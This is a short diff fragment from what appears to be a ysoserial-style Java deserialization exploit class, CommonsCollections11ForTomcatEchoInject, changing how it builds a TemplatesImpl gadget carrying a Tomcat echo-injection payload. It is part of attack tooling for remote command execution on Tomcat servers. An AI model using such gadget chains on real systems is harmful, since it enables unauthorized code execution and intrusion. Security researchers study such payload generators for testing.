@@ -35,7 +35,7 @@ java.security.manager off OR set jdk.xml.enableTemplatesImplDeserialization=true
 public class CommonsCollections11ForTomcatEchoInject extends PayloadRunner implements ObjectPayload<HashSet> {
 
     public HashSet getObject(final String ... command) throws Exception {
-        final Object templates = Gadgets.createTemplatesImpl(null, TomcatEchoInject.class);
+        final Object templates = Gadgets.createTemplatesImpl(TomcatEchoInject.class);
         // mock method name until armed
         final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
 
